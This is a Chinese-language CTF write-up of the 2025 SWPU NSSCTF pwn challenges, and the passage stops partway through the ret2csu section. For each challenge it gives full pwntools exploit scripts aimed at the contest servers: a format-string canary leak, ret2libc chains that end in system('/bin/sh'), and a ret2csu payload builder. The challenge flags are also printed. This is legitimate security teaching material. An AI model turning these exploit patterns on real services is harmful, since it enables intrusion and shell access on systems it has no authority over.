+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776416145227-ab20b359-1f55-4039-bd3d-8b711bdba8c8.png" srcset="/img/loading.gif" lazyload></p>
+<p>NSSCTF{8930b5a3-1c2c-43d6-be61-c87442002c80}</p>
+<h2 id="Darling"><a href="#Darling" class="headerlink" title="Darling"></a>Darling</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403390207-20d6acdf-b14f-4d69-8ebc-439030b9ae06.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776583549802-ec104249-125b-4baf-ae7b-3763743856bb.png" srcset="/img/loading.gif" lazyload></p>
+<p>darling你保护开的有点多啊</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776583571014-499c2074-e58c-4d17-ad18-8cdc73084844.png" srcset="/img/loading.gif" lazyload></p>
+<p>来看看IDA，上来是pic函数和darling函数</p>
+<p>之后设置了20020819为随机数种子，生成了v5</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776583761755-e27d98bb-db34-4b22-9cae-e67bd7a0048b.png" srcset="/img/loading.gif" lazyload></p>
+<p>最后是我们输入一个v4，作比较，和v5一样就进入后门，提权，大致的逻辑还是很清晰的</p>
+<p>看看pic和darling函数，这俩纯是puts输出logo的</p>
+<p>其实很简单，我们都有种子了，直接照葫芦画瓢复现就好了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>int main()<br>&#123;<br>    int v5;<br>    srand(20020819);<br>    v5 = rand() % 100 - 64;<br>    printf(&quot;%d&quot;,v5);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>得到是17</p>
+<p>当然了，本来就限制了区域在[-64,35]</p>
+<p>我们直接爆破也可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br><br>io = remote(&#x27;node5.anna.nssctf.cn&#x27;, 23740)<br>payload=str(17).encode()<br>io.sendlineafter(b&#x27;you.\n&#x27;,payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="你这辈子都是被黑神话害了"><a href="#你这辈子都是被黑神话害了" class="headerlink" title="你这辈子都是被黑神话害了"></a>你这辈子都是被黑神话害了</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403401521-32879af4-53c8-49fa-8c66-1d604f443ccc.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776585121219-5d7669a7-67f4-4631-8e06-9133a34cbb41.png" srcset="/img/loading.gif" lazyload></p>
+<p>说是简单的整数溢出</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776585147178-daa3808a-5a80-4a8c-90be-01e8532cfba9.png" srcset="/img/loading.gif" lazyload></p>
+<p>像闯关，只要不被exit0即可得到shell</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776585329729-a99be63d-0ef7-4e45-85dc-9912b16ffe71.png" srcset="/img/loading.gif" lazyload></p>
+<p>连上大概是这样子的</p>
+<p>这边是以时间作为了随机数种子，不太好直接在外边搞，然后得到两个随机数，存到v5</p>
+<p>强制要求了v6在0x80000000到0xFFFFFFFF之间后，类似于%u输出了v6的值</p>
+<p>最后要求我们输入东西到nptr，这个nptr最后会atoi后存到v7</p>
+<p>要求这个nptr的第一位是-负号，然后转化完的整数v7&lt;0</p>
+<p>还要求无符号的v6和有符号的v7相等</p>
+<p>思路很明确了，拿到输出的数字之后直接-0x100000000然后把东西输入进去就好啦</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776586845972-a900b358-5d1c-4354-ad34-a84a27d168ec.png" srcset="/img/loading.gif" lazyload></p>
+<p>就这样子就好了</p>
+<p>NSSCTF{ec587bbc-a20b-4723-9463-50e297ea95b4}</p>
+<h2 id="babyrop2"><a href="#babyrop2" class="headerlink" title="babyrop2"></a>babyrop2</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403418061-4a61dbd4-1131-4457-a456-273e780fb7fc.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776600882195-420d59ea-b6ec-498f-90d3-f9f41a944190.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到开了NX和Canary的一道题</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776600999603-6536b042-756c-4f8a-b009-485c8d38bcd8.png" srcset="/img/loading.gif" lazyload></p>
+<p>main函数就gift和vuln俩函数</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776601016325-4d08df73-b7c2-4fd7-beab-ebd2bc5a8bf2.png" srcset="/img/loading.gif" lazyload></p>
+<p>先看gift，给了一个格式化字符串的漏洞礼物，但似乎只能输入6个字符</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776601084969-3e21953c-bf43-4fda-8821-62773c5b7fa6.png" srcset="/img/loading.gif" lazyload></p>
+<p>后边vuln是一个栈溢出，还有两个Canary</p>
+<p>大概思路很明确，就是一道利用格式化字符串进行Bypass的姿势</p>
+<p>我们利用格式化字符串输出Canary的值然后填充栈溢出即可</p>
+<p>首要任务是算出Canary在第几个参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br><br>for i in range(1,20):<br>    io = remote(&#x27;node4.anna.nssctf.cn&#x27;, 26631)<br>    payload = f&#x27;%&#123;i&#125;$p&#x27;.encode()<br>    io.sendlineafter(b&#x27;help u!\n&#x27;,payload)<br>    io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>我们可以这样子直接一个个尝试，毕竟长度有限，找到末尾两个是0的大概率就是Canary值</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776601606741-b0095545-97e7-409d-a441-e7df5c47c259.png" srcset="/img/loading.gif" lazyload></p>
+<p>大概率是第七位，当然我们也可以进行计算啊</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">char format[8]; // [rsp+0h] [rbp-10h] BYREF<br>unsigned __int64 v2; // [rsp+8h] [rbp-8h]<br></code></pre></td></tr></table></figure>
+
+<p>根据栈布局，format在rbp-0x10，然后Canary在rbp-0x8</p>
+<p>所以明显是第(0x10-0x8)&#x2F;8+6&#x3D;7</p>
+<p>第七个确实是Canary的值</p>
+<p>之后直接栈溢出即可，就是这题无system无binsh</p>
+<p>所以这边直接进行ret2libc即可</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776602348021-e0e2807a-95db-4f4b-901b-cafd3c061f30.png" srcset="/img/loading.gif" lazyload></p>
+<p>栈结构是这样，我们先叠b’a’*(0x20-8)到canary面前那，然后再去输入8个a之后就能栈溢出了</p>
+<p>前边还需要先泄露一下libc_base</p>
+<p>要传参肯定需要rdi和ret</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776602482291-0d3591e3-61c2-4601-9ef1-90f3cb7dd218.png" srcset="/img/loading.gif" lazyload></p>
+<p>pop_rdi &#x3D; 0x400993</p>
+<p>ret &#x3D; 0x4005f9</p>
+<p>所以我们可以开始编写exp了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>from LibcSearcher import *<br>context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)  <br>io = remote(&#x27;node4.anna.nssctf.cn&#x27;, 26631)<br><br>elf = ELF(&#x27;./pwn&#x27;)<br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>puts_got = elf.got[&#x27;puts&#x27;]<br>vuln_addr = elf.sym[&#x27;vuln&#x27;]<br>pop_rdi = 0x400993<br>ret = 0x4005f9<br><br>#先得到canary的值<br>payload1 = &#x27;--%7$p&#x27;<br>io.sendlineafter(b&#x27;help u!\n&#x27;,payload1)<br>io.recvuntil(b&#x27;--&#x27;)<br>canary = int(io.recvuntil(b&#x27;\n&#x27;),16)<br><br>#接着来得到libc_base<br>payload2 = b&#x27;a&#x27;*(0x20-8)<br>payload2 += p64(canary)<br>payload2 += b&#x27;a&#x27;*8<br>payload2 += p64(pop_rdi)<br>payload2 += p64(puts_got)<br>payload2 += p64(puts_plt)<br>payload2 += p64(vuln_addr)<br>io.sendline(payload2)<br><br>puts_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)     <br>libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)    <br>system_addr = libc_base + libc.dump(&#x27;system&#x27;)  <br>bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)<br><br>#最后来执行system(&#x27;/bin/sh&#x27;)即可<br>payload3 = b&#x27;a&#x27;*(0x20-8)<br>payload3 += p64(canary)<br>payload3 += b&#x27;a&#x27;*8<br>payload3 += p64(pop_rdi)<br>payload3 += p64(bin_sh)<br>payload3 += p64(system_addr)<br>io.sendline(payload3)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776604239994-fcc8164e-ae5d-4b5a-9096-e1e91912db47.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403432317-6771035f-47f1-474c-9c27-7226f15f8c26.png" srcset="/img/loading.gif" lazyload></p>
+<p>也不知道是哪一个PWN2，有一大堆的PWN2</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776604622897-92318f5d-4f29-4795-ac48-606ed5834004.png" srcset="/img/loading.gif" lazyload></p>
+<p>随便挑一个做好了</p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776604684167-42f27185-24ad-4ee2-b718-b3d2ccc2d5df.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776604731570-21a1e5f0-3298-442f-98a4-9d28c463228c.png" srcset="/img/loading.gif" lazyload></p>
+<p>打开IDA发现是一个叫做加密机器的东西</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776604776115-5d52af96-0098-413e-8e1b-7b3b55c92c96.png" srcset="/img/loading.gif" lazyload></p>
+<p>有选项，但是如果我们写2解密就会显示我们可以自己做</p>
+<p>所以这个begin只能写1</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776604843100-3432003b-2bb6-4084-85a7-07488dbacdce.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776604920782-4e4b5cd7-908f-401c-b6c9-ab63a65641af.png" srcset="/img/loading.gif" lazyload></p>
+<p>打开来直接就能看见栈溢出，gets函数+不检测长度</p>
+<p>接下来直接打就好了，直接打ret2libc</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776606048722-28a605ba-3f1c-495a-9d16-1b89e08b285a.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pop_rdi = <span class="hljs-number">0x400c83</span><br>ret = <span class="hljs-number">0x4006b9</span><br></code></pre></td></tr></table></figure>
+
+<p>这一题还需要注意一下栈对齐</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)  <br>io = remote(<span class="hljs-string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="hljs-number">28661</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>encrypt = <span class="hljs-number">0x4009A0</span><br>pop_rdi = <span class="hljs-number">0x400c83</span><br>ret = <span class="hljs-number">0x4006b9</span><br>offset = <span class="hljs-number">0x50</span>+<span class="hljs-number">8</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset<br>payload += p64(pop_rdi)<br>payload += p64(puts_got)<br>payload += p64(puts_plt)<br>payload += p64(encrypt)<br>io.sendlineafter(<span class="hljs-string">b&#x27;Input your choice!&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.sendlineafter(<span class="hljs-string">b&#x27;be encrypted&#x27;</span>,payload)<br><br>puts_addr = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr)     <br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)    <br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)  <br>bin_sh = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*offset<br>payload2 += p64(ret)<br>payload2 += p64(pop_rdi)<br>payload2 += p64(bin_sh)<br>payload2 += p64(system_addr)<br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776606759973-9373cd2d-44ed-4ca4-9922-5d42d4133694.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403441516-ee933e0b-8342-43a2-a9bd-3ba8fcdeaaa0.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776643734322-895d7679-70eb-47b7-8442-824ad5919522.png" srcset="/img/loading.gif" lazyload></p>
+<p>来看看IDA</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776643758913-07e9fe99-aec2-427d-9243-6254adca5ac6.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776643942265-9bb188f6-e686-4d57-98f8-cd6d44b8059f.png" srcset="/img/loading.gif" lazyload></p>
+<p>很明显的栈溢出</p>
+<p>这题提示给的很明确了就是ret2csu，这边我也是跟着博客重温了一下，之前去年暑假学的有点遗忘了</p>
+<p><a target="_blank" rel="noopener" href="https://tamoly.github.io/2025/07/06/%E6%A0%88%E7%9F%A5%E8%AF%86%E7%82%B9/ret2csu/index.html">https://tamoly.github.io/2025/07/06/%E6%A0%88%E7%9F%A5%E8%AF%86%E7%82%B9/ret2csu/index.html</a></p>
+<p>什么是ret2csu，因为我们很多时候找不到函数前六个参数的寄存器对应的gadgets，所以这个主要是在利用x64的__libc_csu_init函数中的gadgets</p>
+<p>这个__libc_csu_init函数是用来对libc初始化的，所以一般这个函数一直都在那边</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776644288415-6155d900-4ea2-4837-9a70-3236a3299bfd.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到的确初始化libc的基本上都会有这个函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python">.text:0000000000401250 ; =============== S U B R O U T I N E =======================================<br>.text:0000000000401250<br>.text:0000000000401250 ; void __fastcall _libc_csu_init(unsigned <span class="hljs-built_in">int</span>, __int64, __int64)<br>.text:0000000000401250                 public __libc_csu_init<br>.text:0000000000401250 __libc_csu_init proc near               ; DATA XREF: _start+1A↑o<br>.text:0000000000401250 ; __unwind &#123;<br>.text:0000000000401250                 endbr64<br>.text:0000000000401254                 push    r15<br>.text:0000000000401256                 lea     r15, __frame_dummy_init_array_entry<br>.text:000000000040125D                 push    r14<br>.text:000000000040125F                 mov     r14, rdx<br>.text:0000000000401262                 push    r13<br>.text:0000000000401264                 mov     r13, rsi<br>.text:0000000000401267                 push    r12<br>.text:0000000000401269                 mov     r12d, edi<br>.text:000000000040126C                 push    rbp<br>.text:000000000040126D                 lea     rbp, __do_global_dtors_aux_fini_array_entry<br>.text:0000000000401274                 push    rbx<br>.text:0000000000401275                 sub     rbp, r15<br>.text:0000000000401278                 sub     rsp, <span class="hljs-number">8</span><br>.text:000000000040127C                 call    _init_proc<br>.text:0000000000401281                 sar     rbp, <span class="hljs-number">3</span><br>.text:0000000000401285                 jz      short loc_4012A6<br>.text:0000000000401287                 xor     ebx, ebx<br>.text:0000000000401289                 nop     dword ptr [rax+00000000h]<br>.text:0000000000401290<br>.text:0000000000401290 loc_401290:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">54</span>↓j<br>.text:0000000000401290                 mov     rdx, r14<br>.text:0000000000401293                 mov     rsi, r13<br>.text:0000000000401296                 mov     edi, r12d<br>.text:0000000000401299                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*<span class="hljs-number">8</span>]<br>.text:000000000040129D                 add     rbx, <span class="hljs-number">1</span><br>.text:00000000004012A1                 cmp     rbp, rbx<br>.text:00000000004012A4                 jnz     short loc_401290<br>.text:00000000004012A6<br>.text:00000000004012A6 loc_4012A6:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">35</span>↑j<br>.text:00000000004012A6                 add     rsp, <span class="hljs-number">8</span><br>.text:00000000004012AA                 pop     rbx<br>.text:00000000004012AB                 pop     rbp<br>.text:00000000004012AC                 pop     r12<br>.text:00000000004012AE                 pop     r13<br>.text:00000000004012B0                 pop     r14<br>.text:00000000004012B2                 pop     r15<br>.text:00000000004012B4                 retn<br>.text:00000000004012B4 ; &#125; // starts at <span class="hljs-number">401250</span><br>.text:00000000004012B4 __libc_csu_init endp<br></code></pre></td></tr></table></figure>
+
+<p>主要利用的是下边两部分的汇编，我们先来看第一段</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">.text:00000000004012A6 loc_4012A6:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">35</span>↑j<br>.text:00000000004012A6                 add     rsp, <span class="hljs-number">8</span><br>.text:00000000004012AA                 pop     rbx<br>.text:00000000004012AB                 pop     rbp<br>.text:00000000004012AC                 pop     r12<br>.text:00000000004012AE                 pop     r13<br>.text:00000000004012B0                 pop     r14<br>.text:00000000004012B2                 pop     r15<br>.text:00000000004012B4                 retn<br>.text:00000000004012B4 ; &#125; // starts at <span class="hljs-number">401250</span><br></code></pre></td></tr></table></figure>
+
+<p>这边首先是add抬高了一位，当然我们直接栈溢出转过来的时候可以直接从下边的pop rbx开始</p>
+<p>后边的内容可以看到基本上都是pop，一个个pop寄存器参数，弹给rbx，rbp，r12，r13，r14，r15</p>
+<p>这边我们一般把rbx设置为0，方便后边call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</p>
+<p>就可以直接r15设置啥就是啥了，不用考虑rbx了</p>
+<p>而同时我们也一般把rbp设置为1，因为这个后边就是add rbx,1和cmp，是1的话就和加1之后的rbp一样了，就不用跳转了</p>
+<p>最后通过ret我们跳到下边这个第二段</p>
+<p>接着看第二段</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">.text:0000000000401290 loc_401290:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">54</span>↓j<br>.text:0000000000401290                 mov     rdx, r14<br>.text:0000000000401293                 mov     rsi, r13<br>.text:0000000000401296                 mov     edi, r12d<br>.text:0000000000401299                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*<span class="hljs-number">8</span>]<br>.text:000000000040129D                 add     rbx, <span class="hljs-number">1</span><br>.text:00000000004012A1                 cmp     rbp, rbx<br>.text:00000000004012A4                 jnz     short loc_401290<br>.text:00000000004012A6<br></code></pre></td></tr></table></figure>
+
+<p>可以看到这边的顺序不是固定的，需要具体情况具体分析</p>
+<p>这边是先把r14给了rdx，r13给了rsi，r12给了edi</p>
+<p>这个时候rdi值是0，我们是可以控制rdi的值的</p>
+<p>只需要把东西在第一段压入r12，之后执行mov     edi, r12d的时候rdi就会被设置为r12的低32位了</p>
+<p>call直接跳转到r15的位置，因为我们把rbp搞成0了</p>
+<p>后边的jzn也已经被我们绕过了</p>
+<p>最后这个第二段走完之后我们又会走到第一段，不过六个寄存器都没用了，随便设置就好了，我们只要控制好rdi,rsi,rdx三个寄存器即可，直接填充7*8个字符到返回地址之后设置返回地址即可</p>
+<p>rdi,rsi,rdx就可以拿来填充write函数了</p>
+<p>这边放一份脚本，也是tamoly师傅博客上的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ret_csu</span>(<span class="hljs-params">r12, r13, r14, r15, last</span>):<br>	payload = <span class="hljs-string">b&#x27;a&#x27;</span>* offset                <span class="hljs-comment">#填充偏移量</span><br>	payload += p64(csu1) + p64(<span class="hljs-number">0</span>)         <br>	<span class="hljs-comment">#p64(csu1) 到pop rbx,rbp,r12,r13,r14,r15</span><br>	<span class="hljs-comment">#p64(0) rsp+8的填充</span><br>	payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<br>	<span class="hljs-comment">#rbx=0 call指令跳转到对应的地方(这里是跳转到r15)</span><br>	<span class="hljs-comment">#rbp=1 不重新执行2段</span><br>	payload += p64(r12) + p64(r13) + p64(r14) + p64(r15)<br>	<span class="hljs-comment">#三个参数的寄存器(这里是rdi=edi=r12 rsi=r13 rdx=r14 r15是我们想调用的函数)</span><br>	payload += p64(csu2)<br>	payload+=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span>+p64(last)            <span class="hljs-comment">#填充 最后返回地址</span><br>	io.sendline(payload)<br></code></pre></td></tr></table></figure>
+
+<p>之后我们就开始针对这一题看吧，其实分析的蛮全面了，我们一开始构造栈溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset<br></code></pre></td></tr></table></figure>
+
+<p>之后溢出后直接跳到第一段，然后一个个寄存器设置值，最后构造的是write(1,write_got,8)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload += p64(csu1_addr)   <span class="hljs-comment">#我跳过了那个add，所以这边不用p64（0），不然是需要的</span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)<br>payload += p64(<span class="hljs-number">1</span>)+p64(write_got)+p64(<span class="hljs-number">8</span>)+p64(write_got)<br></code></pre></td></tr></table></figure>
+
